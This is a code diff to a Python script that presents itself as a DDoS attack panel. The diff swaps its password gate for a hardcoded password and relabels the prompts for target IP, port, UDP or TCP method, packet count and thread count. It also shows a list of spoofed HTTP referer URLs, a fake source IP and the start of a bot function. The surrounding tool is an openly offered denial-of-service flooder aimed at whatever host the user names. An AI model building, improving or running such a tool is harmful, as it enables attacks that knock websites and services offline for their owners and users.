@@ -173,24 +173,8 @@ referers = [
 'http://eu.battle.net/wow/en/search?q=']
 
 
-print("")
-print(" ╭━━━╮╱╱╭╮╭╮╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱")
-print(" ┃╭━╮┃╱╭╯╰┫┃╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╭╯╰╮")
-print(" ┃┃╱┃┣╮┣╮╭┫╰━┳━━┳━╋╮╭╋┳━━┳━┻╮╭╋┳━━┳━╮")
-print(" ┃╰━╯┃┃┃┃┃┃╭╮┃┃━┫╭╮┫┃┣┫╭━┫╭╮┃┃┣┫╭╮┃╭╮╮")
-print(" ┃╭━╮┃╰╯┃╰┫┃┃┃┃━┫┃┃┃╰┫┃╰━┫╭╮┃╰┫┃╰╯┃┃┃┃")
-print(" ╰╯╱╰┻━━┻━┻╯╰┻━━┻╯╰┻━┻┻━━┻╯╰┻━┻┻━━┻╯╰╯")
-print("")
+ifpasswd = "daniwibu"
 
-print("Type PassWord")
-print("")
-
-authmpick = input(" ArakTuak/AUTH > ")
-method1xx = "PassWord"
-ifpasswd = "DontLeak"
-
-if authmpick==method1xx:
-    os.system("cls")
     print("")
     print("Input PassWord")
     print("")
@@ -218,12 +202,12 @@ print(" ** Last step to the DDoS Pane!!, GoodLuck!")
 time.sleep(3)
 
 print("")
-name = str(input(" ArakTuak/InputName > "))
-ip = str(input(" ArakTuak/TargetIP > "))
-port = int(input(" ArakTuak/DestinationPort > "))
-method = str(input(" ArakTuak/UDPorTCP > "))
-times = int(input(" ArakTuak/Packets > "))
-threads = int(input(" ArakTuak/Threads > "))
+name = str(input(" Input Name > "))
+ip = str(input(" Target IP > "))
+port = int(input(" Destination Port > "))
+method = str(input(" UDP or TCP > "))
+times = int(input(" Packets > "))
+threads = int(input(" Threads > "))
 fake_ip = '182.21.20.32'
 
 def my_bots():
